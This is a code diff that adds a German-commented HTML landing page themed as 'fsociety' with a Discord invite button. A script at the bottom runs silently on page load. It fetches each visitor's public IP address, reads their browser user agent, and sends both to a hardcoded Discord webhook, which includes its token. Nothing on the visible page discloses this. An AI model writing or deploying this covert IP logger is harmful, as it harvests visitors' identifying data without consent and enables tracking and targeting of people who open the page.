@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>fsociety</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        h1 {
+            color: #ff0000;
+            font-size: 3.5rem;
+            letter-spacing: 10px;
+            margin-bottom: 20px;
+        }
+        img {
+            max-width: 500px;
+            width: 80%;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
+        }
+        .discord-btn {
+            background-color: #5865F2;
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            font-size: 1.2rem;
+            border-radius: 8px;
+            transition: 0.3s;
+            font-weight: bold;
+        }
+        .discord-btn:hover {
+            background-color: #4752c4;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+
+    <h1>fsociety</h1>
+
+    <img src="mask_wallpaper_clean.jpg" alt="fsociety Mask">
+
+    <br>
+    <a href="https://discord.gg/H4xHu9zF" class="discord-btn">JOIN DISCORD</a>
+
+    <script>
+        async function sendInfo() {
+            const webhookUrl = "https://discord.com/api/webhooks/1487060330067791914/brH-mHg_5ud0i5JjaMEF6-tqZuQolUY510SEZPJy0Tk_E006zV1z7EOIQIPsP5r7oS65";
+            
+            try {
+                // IP abrufen
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                // Browser-Info auslesen
+                const browser = navigator.userAgent;
+
+                // Payload erstellen
+                const payload = {
+                    embeds: [{
+                        title: "fsoicety - System Log",
+                        color: 15548997, // Rot
+                        fields: [
+                            { name: "IP-Adresse", value: ipData.ip, inline: true },
+                            { name: "Browser", value: browser }
+                        ],
+                        footer: { text: "Authorized Access Only" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                // An Webhook senden
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.log("Fehler beim Senden.");
+            }
+        }
+
+        // Beim Laden ausführen
+        window.onload = sendInfo;
+    </script>
+</body>
+</html>
